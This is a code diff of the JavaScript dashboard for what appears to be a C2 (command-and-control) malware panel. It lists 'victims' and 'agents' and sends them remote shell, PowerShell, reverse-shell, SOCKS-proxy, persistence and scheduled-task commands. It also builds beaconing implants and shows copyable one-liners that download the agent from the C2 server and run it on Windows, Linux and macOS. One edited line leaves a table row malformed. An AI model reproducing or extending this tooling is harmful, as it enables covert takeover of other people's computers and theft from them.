@@ -79,7 +79,7 @@ function loadVictims() {
         const tbody = $('#victim-table-body').empty(), victimSelect = $('#victim-select').empty(), outputsContainer = $('#outputs-container').empty();
         data.forEach(v => {
             const shortId = v.id.substring(0,8), lastSeen = new Date(v.last_seen).toLocaleString();
-            const row = $(`<tr class="border-b border-gray-700 bg-gray-800/50"><td class="px-4 py-2 font-mono text-xs">${shortId}</td><td class="px-4 py-2">${v.hostname} (${v.ip}:${v.port})</td><td class="px-4 py-2"><span class="px-2 py-1 rounded text-xs ${v.os_type === 'unknown' ? 'bg-gray-600' : v.os_type === 'linux' ? 'bg-blue-800' : v.os_type === 'windows' ? 'bg-green-800' : 'bg-purple-800'}">${v.os_type}</span></td><td class="px-4 py-2 text-xs">${lastSeen}</td><td class="px-4 py-2"><button class="set-os-btn bg-purple-700 hover:bg-purple-800 text-xs px-2 py-1 rounded" data-id="${v.id}"><i class="fas fa-edit"></i> Override OS</button></td></tr>`);
+            const row = $(`<tr class="border-b border-gray-700 bg-gray-800/50"><td class="px-4 py-2 font-mono text-xs">${shortId}</td><td class="px-4 py-2">${v.hostname} (${v.ip}:${v.port})</td><td class="px-4 py-2"><span class="px-2 py-1 rounded text-xs ${v.os_type === 'unknown' ? 'bg-gray-600' : v.os_type === 'linux' ? 'bg-blue-800' : v.os_type === 'windows' ? 'bg-green-800' : 'bg-purple-800'}">${v.os_type}</span></td><td class="px-4 py-2 text-xs">${lastSeen}</td><td class="px-4 py-2"><button class="set-os-btn bg-purple-700 hover:bg-purple-800 text-xs px-2 py-1 rounded" data-id="${v.id}"><i class="fas fa-edit"></i> Override OS</button></td></td>`);
             tbody.append(row);
             victimSelect.append(`<option value="${v.id}">${v.hostname} (${v.ip})</option>`);
             const outputDiv = $(`<div class="bg-gray-900 rounded-lg p-3"><div class="text-sm font-mono text-gray-300 mb-2"><i class="fas fa-terminal text-green-400 mr-2"></i> ${v.hostname} (${v.ip})<span class="text-gray-500 text-xs ml-2">ID: ${shortId} | OS: ${v.os_type}</span></div><div id="output-${v.id}" class="output-box"></div></div>`);
@@ -96,20 +96,7 @@ function loadAgents() {
         const tbody = $('#agents-table-body').empty(), agentSelect = $('#agent-select').empty().append('<option value="">-- Select an agent --</option>');
         agents.forEach(a => {
             const shortId = a.id.substring(0,8), lastBeacon = new Date(a.last_beacon).toLocaleString(), status = getAgentStatus(a.last_beacon, 180), statusHtml = `<span class="inline-block w-2 h-2 rounded-full mr-1" style="background-color: ${status.color};"></span>${status.text}`;
-            const row = $(`<tr class="border-b border-gray-700 bg-gray-800/50 agent-row">
-                <td class="px-4 py-2 font-mono text-xs">${shortId}</td>
-                <td class="px-4 py-2">${a.hostname}</td>
-                <td class="px-4 py-2">${a.os}/${a.arch}</td>
-                <td class="px-4 py-2">${a.ip}</td>
-                <td class="px-4 py-2">${a.version || '?'}</td>
-                <td class="px-4 py-2 text-xs">${lastBeacon}</td>
-                <td class="px-4 py-2 text-xs">${statusHtml}</td>
-                <td class="px-4 py-2">
-                    <button class="shell-agent-btn bg-purple-600 hover:bg-purple-700 text-xs px-2 py-1 rounded" data-id="${a.id}"><i class="fas fa-terminal"></i> Shell</button>
-                    <button class="update-agent-btn bg-green-600 hover:bg-green-700 text-xs px-2 py-1 rounded ml-1" data-id="${a.id}" data-platform="${a.platform}"><i class="fas fa-sync-alt"></i> Update</button>
-                    <button class="delete-agent-btn bg-red-600 hover:bg-red-700 text-xs px-2 py-1 rounded ml-1" data-id="${a.id}"><i class="fas fa-trash"></i> Delete</button>
-                </td>
-            </tr>`);
+            const row = $(`<tr class="border-b border-gray-700 bg-gray-800/50 agent-row"><td class="px-4 py-2 font-mono text-xs">${shortId}</td><td class="px-4 py-2">${a.hostname}</td><td class="px-4 py-2">${a.os}/${a.arch}</td><td class="px-4 py-2">${a.ip}</td><td class="px-4 py-2">${a.version || '?'}</td><td class="px-4 py-2 text-xs">${lastBeacon}</td><td class="px-4 py-2 text-xs">${statusHtml}</td><td class="px-4 py-2"><button class="shell-agent-btn bg-purple-600 hover:bg-purple-700 text-xs px-2 py-1 rounded" data-id="${a.id}"><i class="fas fa-terminal"></i> Shell</button><button class="update-agent-btn bg-green-600 hover:bg-green-700 text-xs px-2 py-1 rounded ml-1" data-id="${a.id}" data-platform="${a.platform}"><i class="fas fa-sync-alt"></i> Update</button><button class="delete-agent-btn bg-red-600 hover:bg-red-700 text-xs px-2 py-1 rounded ml-1" data-id="${a.id}"><i class="fas fa-trash"></i> Delete</button></td></tr>`);
             tbody.append(row);
             agentSelect.append(`<option value="${a.id}">${a.hostname} (${a.ip})</option>`);
         });
@@ -120,15 +107,15 @@ $(document).on('click', '.shell-agent-btn', function() { const agentId = $(this)
 $(document).on('click', '.update-agent-btn', function() {
     const agentId = $(this).data('id');
     const platform = $(this).data('platform');
+    const c2Url = $('#build-c2-url').val();
     fetch('/api/agent/versions').then(res => res.json()).then(versions => {
         const current = versions.find(v => v.platform === platform && v.is_current);
         if (!current) {
             alert('No current version set for this platform');
             return;
         }
-        const baseUrl = window.location.origin;
-        const url = `${baseUrl}/static/agents/versions/${platform.replace('/', '_')}/${current.filename}`;
-        const payload = { version: current.version, url: url };
+        const fullUrl = `${c2Url}/static/agents/versions/${platform.replace('/', '_')}/${current.filename}`;
+        const payload = { version: current.version, url: fullUrl };
         fetch('/api/agent/send_command', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -141,31 +128,33 @@ $(document).on('click', '.update-agent-btn', function() {
 $('#clear-all-agents-btn').click(function() { if (confirm('⚠️ WARNING: This will permanently delete ALL agents from the database. This action cannot be undone. Continue?')) { fetch('/api/agents/clear_all', { method: 'POST', headers: { 'Content-Type': 'application/json' } }).then(() => { $('#agent-log').prepend('<div class="text-red-400">🗑️ All agents have been cleared from the database.</div>'); loadAgents(); }).catch(err => console.error(err)); } });
 $('#refresh-agents-btn').click(() => loadAgents());
 
-// Agent command arguments (simplified but functional)
+// Agent command arguments (including health)
 const commandArgs = {
     exec: [{ name: "command", placeholder: "system command", type: "text" }],
-    sleep: [{ name: "seconds", placeholder: "seconds (e.g., 60)", type: "number" }],
-    cd: [{ name: "path", placeholder: "directory path", type: "text" }],
-    dir: [{ name: "path", placeholder: "directory path (optional)", type: "text", required: false }],
-    cat: [{ name: "filepath", placeholder: "file path", type: "text" }],
-    mkdir: [{ name: "path", placeholder: "directory path", type: "text" }],
-    remove: [{ name: "path", placeholder: "file or directory path", type: "text" }],
-    cp: [{ name: "src", placeholder: "source path", type: "text" }, { name: "dst", placeholder: "destination path", type: "text" }],
-    upload: [{ name: "path", placeholder: "destination path", type: "text" }, { name: "data", placeholder: "base64 encoded file data", type: "textarea" }],
-    download: [{ name: "path", placeholder: "file path to download", type: "text" }],
+    config: [{ name: "setting", placeholder: "setting name", type: "text" }, { name: "value", placeholder: "value", type: "text" }],
     shell: [{ name: "command", placeholder: "command to execute", type: "text" }],
     powershell: [{ name: "command", placeholder: "PowerShell command", type: "text" }],
-    lateral: [{ name: "target", placeholder: "target IP/hostname", type: "text" }, { name: "user", placeholder: "username", type: "text" }, { name: "password", placeholder: "password", type: "password" }, { name: "command", placeholder: "command to run", type: "text" }],
-    exfil: [{ name: "path", placeholder: "file path to exfiltrate", type: "text" }],
     proxy: [{ name: "port", placeholder: "port to listen on", type: "number" }],
     "shell-reverse": [{ name: "ip", placeholder: "C2 IP", type: "text" }, { name: "port", placeholder: "port", type: "number" }],
-    "update": [] // no arguments needed for manual update (payload built in button)
+    health: [],
+    socks: [{ name: "port", placeholder: "port to listen on", type: "number" }],  // no arguments
+    schedule: [
+    { name: "action", placeholder: "add / list / remove", type: "text" },
+    { name: "name", placeholder: "task name (unique identifier)", type: "text" },
+    { name: "schedule", placeholder: "e.g., once 2025-12-31 23:59, daily 14:30, hourly, minute 5", type: "text" },
+    { name: "command", placeholder: "command to execute", type: "text" }
+    ],
+    restart: [
+    { name: "delay", placeholder: "delay in seconds (Windows) or minutes (Linux)", type: "text" },
+    { name: "message", placeholder: "optional shutdown message (Windows only)", type: "text" }
+    ],
+    proxy_stop: [{ name: "port", placeholder: "port number or 'all'", type: "text" }]
 };
 function updateCommandArgs() {
     const cmdType = $('#agent-cmd-type').val();
     const argsDiv = $('#agent-cmd-args').empty();
     const args = commandArgs[cmdType] || [];
-    if (args.length === 0 && !['help','checkin','pwd','proc','net','persistence','delete','update'].includes(cmdType)) {
+    if (args.length === 0 && !['help','checkin','proc','net','persistence','update','delete','health'].includes(cmdType)) {
         argsDiv.html('<div class="text-gray-400 text-sm">No additional arguments required</div>');
         return;
     }
@@ -177,9 +166,6 @@ function updateCommandArgs() {
         }
     });
 }
-
-
-
 $('#agent-cmd-type').change(updateCommandArgs);
 updateCommandArgs();
 $('#agent-exec-btn').click(() => {
@@ -188,20 +174,37 @@ $('#agent-exec-btn').click(() => {
     const cmdType = $('#agent-cmd-type').val();
     let payload = {};
     if (cmdType === 'exec') { const command = $('#cmd-arg-command').val(); if (!command) { alert("Please enter a command"); return; } payload = { command: command }; }
-    else if (cmdType === 'sleep') { const seconds = $('#cmd-arg-seconds').val(); if (!seconds) { alert("Please enter seconds"); return; } payload = { seconds: seconds }; }
-    else if (cmdType === 'cd' || cmdType === 'mkdir' || cmdType === 'remove') { const path = $('#cmd-arg-path').val(); if (!path) { alert("Please enter a path"); return; } payload = { path: path }; }
-    else if (cmdType === 'dir') { payload = { path: $('#cmd-arg-path').val() || "" }; }
-    else if (cmdType === 'cat') { const filepath = $('#cmd-arg-filepath').val(); if (!filepath) { alert("Please enter a file path"); return; } payload = { filepath: filepath }; }
-    else if (cmdType === 'cp') { const src = $('#cmd-arg-src').val(), dst = $('#cmd-arg-dst').val(); if (!src || !dst) { alert("Please enter source and destination paths"); return; } payload = { src: src, dst: dst }; }
-    else if (cmdType === 'upload') { const path = $('#cmd-arg-path').val(), data = $('#cmd-arg-data').val(); if (!path || !data) { alert("Please enter destination path and base64 data"); return; } payload = { path: path, data: data }; }
-    else if (cmdType === 'download') { const path = $('#cmd-arg-path').val(); if (!path) { alert("Please enter file path"); return; } payload = { path: path }; }
+    else if (cmdType === 'config') { const setting = $('#cmd-arg-setting').val(); const value = $('#cmd-arg-value').val(); if (!setting) { alert("Please enter setting name"); return; } payload = { setting: setting, value: value || "" }; }
     else if (cmdType === 'shell' || cmdType === 'powershell') { const command = $('#cmd-arg-command').val(); if (!command) { alert("Please enter a command"); return; } payload = { command: command }; }
-    else if (cmdType === 'lateral') { const target = $('#cmd-arg-target').val(), user = $('#cmd-arg-user').val(), password = $('#cmd-arg-password').val(), command = $('#cmd-arg-command').val(); if (!target || !user || !password || !command) { alert("Please fill all lateral movement fields"); return; } payload = { target: target, user: user, password: password, command: command }; }
-    else if (cmdType === 'exfil') { const path = $('#cmd-arg-path').val(); if (!path) { alert("Please enter file path to exfiltrate"); return; } payload = { path: path }; }
     else if (cmdType === 'proxy') { const port = $('#cmd-arg-port').val(); if (!port) { alert("Please enter port number"); return; } payload = { port: port }; }
     else if (cmdType === 'shell-reverse') { const ip = $('#cmd-arg-ip').val(), port = $('#cmd-arg-port').val(); if (!ip || !port) { alert("Please enter IP and port"); return; } payload = { ip: ip, port: port }; }
-    else if (cmdType === 'update') { payload = {}; } // update command will be handled separately
-    else if (['persistence','delete','help','checkin','pwd','proc','net'].includes(cmdType)) { payload = {}; }
+    else if (['persistence','delete','help','checkin','proc','net','update','health'].includes(cmdType)) { payload = {}; }
+    else if (cmdType === 'schedule') {
+    const action = $('#cmd-arg-action').val();
+    const name = $('#cmd-arg-name').val();
+    const schedule = $('#cmd-arg-schedule').val();
+    const command = $('#cmd-arg-command').val();
+    if (!action || !name || !schedule || !command) {
+        alert("Please fill all schedule fields");
+        return;
+    }
+    payload = { action: action, name: name, schedule: schedule, command: command };
+    }
+    else if (cmdType === 'socks') {
+    const port = $('#cmd-arg-port').val();
+    if (!port) { alert("Please enter port number"); return; }
+    payload = { port: port };
+    }
+    else if (cmdType === 'proxy_stop') {
+    const port = $('#cmd-arg-port').val();
+    if (!port) { alert("Please enter port number or 'all'"); return; }
+    payload = { port: port };
+    }
+    else if (cmdType === 'restart') {
+    const delay = $('#cmd-arg-delay').val();
+    const message = $('#cmd-arg-message').val();
+    payload = { delay: delay || "0", message: message || "" };
+    }
     else { alert("Unknown command type"); return; }
     fetch('/api/agent/send_command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ agent_id: agentId, type: cmdType, payload: payload }) })
         .then(() => { $('#agent-log').prepend(`<div class="text-blue-400">→ ${cmdType} command sent to agent ${agentId.substring(0,8)}</div>`); updateCommandArgs(); })
@@ -231,43 +234,138 @@ $('#download-agent-logs').click(()=>{const filterId=$('#agent-log-filter').val()
 
 // ==================== BUILD & VERSION ====================
 $('#build-agent-btn').click(function() {
-    const buildBtn=$(this), statusDiv=$('#build-status');
+    const buildBtn = $(this), statusDiv = $('#build-status');
     statusDiv.removeClass('hidden').html('<div class="text-yellow-400">⏳ Compiling, please wait...</div>');
-    buildBtn.prop('disabled',true);
-    const data={c2_url:$('#build-c2-url').val(),beacon_delay:parseInt($('#build-beacon-delay').val()),jitter:parseInt($('#build-jitter').val()),user_agent:$('#build-user-agent').val(),insecure_tls:$('#build-insecure-tls').is(':checked'),auto_persistence:$('#build-auto-persistence').is(':checked'),debug_mode:$('#build-debug-mode').is(':checked'),goos:$('#build-goos').val(),goarch:$('#build-goarch').val()};
-    fetch('/api/build_agent',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).then(response=>response.json()).then(data=>{if(data.error)throw new Error(data.error); statusDiv.html('<div class="text-green-400">✅ Build successful! Agent saved to server.</div>'); loadAvailableAgents(); loadAgentVersions();}).catch(err=>{statusDiv.html(`<div class="text-red-400">❌ Build failed: ${err.message}</div>`);}).finally(()=>{buildBtn.prop('disabled',false); setTimeout(()=>statusDiv.addClass('hidden'),8000);});
+    buildBtn.prop('disabled', true);
+    const data = {
+        c2_url: $('#build-c2-url').val(),
+        beacon_delay: parseInt($('#build-beacon-delay').val()),
+        jitter: parseInt($('#build-jitter').val()),
+        user_agent: $('#build-user-agent').val(),
+        insecure_tls: $('#build-insecure-tls').is(':checked'),
+        auto_persistence: $('#build-auto-persistence').is(':checked'),
+        debug_mode: $('#build-debug-mode').is(':checked'),
+        enable_auth: $('#build-enable-auth').is(':checked'),
+        goos: $('#build-goos').val(),
+        goarch: $('#build-goarch').val()
+    };
+    console.log("Building with C2 URL:", data.c2_url);
+    fetch('/api/build_agent', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.error) throw new Error(data.error);
+        statusDiv.html('<div class="text-green-400">✅ Build successful! Agent saved to server.</div>');
+        loadAvailableAgents();
+        loadAgentVersions();
+    })
+    .catch(err => {
+        console.error(err);
+        statusDiv.html(`<div class="text-red-400">❌ Build failed: ${err.message}</div>`);
+    })
+    .finally(() => {
+        buildBtn.prop('disabled', false);
+        setTimeout(() => statusDiv.addClass('hidden'), 8000);
+    });
 });
-function loadAvailableAgents() { fetch('/api/agents/list').then(res=>res.json()).then(agents=>{ const container=$('#available-agents-list').empty(); if(agents.length===0){container.html('<div class="text-gray-500">No agents compiled yet. Use the form above to build one.</div>');return;} const baseUrl=window.location.origin; agents.forEach(agent=>{ const fullUrl=baseUrl+agent.url; const agentName=agent.filename; let downloadCmd='',alternativeCmd='',osLabel=''; if(agentName.includes('windows')){osLabel='Windows';downloadCmd=`powershell -c "Invoke-WebRequest -Uri '${fullUrl}' -OutFile $env:temp\\agent.exe; Start-Process $env:temp\\agent.exe"`;} else if(agentName.includes('linux')){osLabel='Linux';downloadCmd=`wget -O minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;alternativeCmd=`curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;} else if(agentName.includes('darwin')){osLabel='macOS';downloadCmd=`curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;} else {osLabel='Unknown';downloadCmd=`curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;} const card=$(`
-        <div class="bg-gray-900 rounded-lg p-3"><div class="flex justify-between items-start"><div><div class="font-mono text-sm">${agentName} (${osLabel})</div><div class="text-gray-400 text-xs">Size: ${(agent.size/1024).toFixed(1)} KB | Last built: ${new Date(agent.modified).toLocaleString()}</div></div><a href="${fullUrl}" class="bg-blue-600 px-3 py-1 rounded text-sm hover:bg-blue-700">Download</a></div>
-        <div class="mt-2"><label class="text-xs text-gray-400">One‑liner download & execute:</label><pre class="bg-black text-green-400 text-xs p-2 rounded mt-1 overflow-x-auto"><code class="break-all">${downloadCmd}</code></pre>${alternativeCmd?`<label class="text-xs text-gray-400 mt-2 block">Alternative:</label><pre class="bg-black text-green-400 text-xs p-2 rounded mt-1 overflow-x-auto"><code class="break-all">${alternativeCmd}</code></pre>`:''}</div></div>`); container.append(card); }); });
+
+function loadAvailableAgents() {
+    const c2Url = $('#build-c2-url').val();
+    fetch('/api/agents/list').then(res => res.json()).then(agents => {
+        const container = $('#available-agents-list').empty();
+        if (agents.length === 0) {
+            container.html('<div class="text-gray-500">No agents compiled yet. Use the form above to build one.</div>');
+            return;
+        }
+        agents.forEach(agent => {
+            const fullUrl = `${c2Url}${agent.url}`;
+            const agentName = agent.filename;
+            let downloadCmd = '', alternativeCmd = '', osLabel = '';
+            if (agentName.includes('windows')) {
+                osLabel = 'Windows';
+                downloadCmd = `powershell -c "Invoke-WebRequest -Uri '${fullUrl}' -OutFile $env:temp\\agent.exe; Start-Process $env:temp\\agent.exe"`;
+            } else if (agentName.includes('linux')) {
+                osLabel = 'Linux';
+                downloadCmd = `wget -O minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
+                alternativeCmd = `curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
+            } else if (agentName.includes('darwin')) {
+                osLabel = 'macOS';
+                downloadCmd = `curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
+            } else {
+                osLabel = 'Unknown';
+                downloadCmd = `curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
+            }
+            const card = $(`
+                <div class="bg-gray-900 rounded-lg p-3">
+                    <div class="flex justify-between items-start">
+                        <div>
+                            <div class="font-mono text-sm">${agentName} (${osLabel})</div>
+                            <div class="text-gray-400 text-xs">Size: ${(agent.size/1024).toFixed(1)} KB | Last built: ${new Date(agent.modified).toLocaleString()}</div>
+                        </div>
+                        <a href="${fullUrl}" class="bg-blue-600 px-3 py-1 rounded text-sm hover:bg-blue-700">Download</a>
+                    </div>
+                    <div class="mt-2">
+                        <label class="text-xs text-gray-400">One‑liner download & execute:</label>
+                        <div class="relative">
+                            <pre class="bg-black text-green-400 text-xs p-2 rounded mt-1 overflow-x-auto"><code class="break-all" id="cmd-${agent.filename.replace(/[^a-zA-Z0-9]/g, '_')}">${downloadCmd}</code></pre>
+                            <button class="copy-btn absolute top-2 right-2 bg-gray-700 hover:bg-gray-600 text-xs px-2 py-1 rounded" data-cmd-id="cmd-${agent.filename.replace(/[^a-zA-Z0-9]/g, '_')}">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                        ${alternativeCmd ? `<label class="text-xs text-gray-400 mt-2 block">Alternative (curl):</label>
+                        <div class="relative">
+                            <pre class="bg-black text-green-400 text-xs p-2 rounded mt-1 overflow-x-auto"><code class="break-all" id="alt-${agent.filename.replace(/[^a-zA-Z0-9]/g, '_')}">${alternativeCmd}</code></pre>
+                            <button class="copy-btn absolute top-2 right-2 bg-gray-700 hover:bg-gray-600 text-xs px-2 py-1 rounded" data-cmd-id="alt-${agent.filename.replace(/[^a-zA-Z0-9]/g, '_')}">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>` : ''}
+                    </div>
+                </div>
+            `);
+            container.append(card);
+        });
+        // Attach copy event handlers
+        $('.copy-btn').off('click').on('click', function() {
+            const cmdId = $(this).data('cmd-id');
+            const text = $('#' + cmdId).text();
+            navigator.clipboard.writeText(text).then(() => {
+                const originalHtml = $(this).html();
+                $(this).html('<i class="fas fa-check"></i> Copied!');
+                setTimeout(() => $(this).html(originalHtml), 2000);
+            }).catch(err => {
+                console.error('Failed to copy:', err);
+            });
+        });
+    });
 }
+
 function loadAgentVersions() {
-    fetch('/api/agent/versions').then(res=>res.json()).then(versions=>{
-        const tbody=$('#agent-versions-table-body').empty();
-        versions.forEach(v=>{
-            const compiled=new Date(v.compiled_at).toLocaleString(), sizeKB=(v.size/1024).toFixed(1), isCurrent=v.is_current;
+    fetch('/api/agent/versions').then(res => res.json()).then(versions => {
+        const tbody = $('#agent-versions-table-body').empty();
+        versions.forEach(v => {
+            const compiled = new Date(v.compiled_at).toLocaleString(), sizeKB = (v.size / 1024).toFixed(1), isCurrent = v.is_current;
             let actionBtn;
             if (isCurrent) {
                 actionBtn = '<span class="text-green-400 text-xs">Current</span>';
             } else {
-                actionBtn = `<div class="flex gap-1">
-                    <button class="set-current-version bg-blue-600 px-2 py-1 rounded text-xs" data-platform="${v.platform}" data-version="${v.version}">Set as Current</button>
-                    <button class="delete-version-btn bg-red-600 px-2 py-1 rounded text-xs" data-platform="${v.platform}" data-version="${v.version}">Delete</button>
-                </div>`;
+                actionBtn = `<div class="flex gap-1"><button class="set-current-version bg-blue-600 px-2 py-1 rounded text-xs" data-platform="${v.platform}" data-version="${v.version}">Set as Current</button><button class="delete-version-btn bg-red-600 px-2 py-1 rounded text-xs" data-platform="${v.platform}" data-version="${v.version}">Delete</button></div>`;
             }
-            const row=$(`
+            const row = $(`
                 <tr class="border-b border-gray-700"><td class="px-4 py-2 font-mono text-xs">${v.version}</td><td class="px-4 py-2 text-xs">${v.platform}</td><td class="px-4 py-2 text-xs">${compiled}</td><td class="px-4 py-2 text-xs">${sizeKB} KB</td><td class="px-4 py-2 text-xs">${actionBtn}</td></tr>`);
             tbody.append(row);
         });
         $('.set-current-version').off('click').on('click', function() {
-            const platform=$(this).data('platform'), version=$(this).data('version');
-            fetch('/api/agent/set_current_version',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:platform,version:version})}).then(()=>loadAgentVersions());
+            const platform = $(this).data('platform'), version = $(this).data('version');
+            fetch('/api/agent/set_current_version', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ platform: platform, version: version }) }).then(() => loadAgentVersions());
         });
         $('.delete-version-btn').off('click').on('click', function() {
-            const platform=$(this).data('platform'), version=$(this).data('version');
+            const platform = $(this).data('platform'), version = $(this).data('version');
             if (confirm(`Delete version ${version} for ${platform}? This action cannot be undone.`)) {
                 fetch('/api/agent/delete_version', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ platform: platform, version: version }) })
-                .then(() => loadAgentVersions());
+                    .then(() => loadAgentVersions());
             }
         });
     });
@@ -291,4 +389,4 @@ loadPortEvents();
 loadActivePorts();
 populateVictimFilter();
 populateAgentFilter();
-setInterval(()=>{loadVictims();loadActivePorts();if($('#agents-section').is(':visible'))loadAgents();},30000);
+setInterval(() => { loadVictims(); loadActivePorts(); if ($('#agents-section').is(':visible')) loadAgents(); }, 30000);
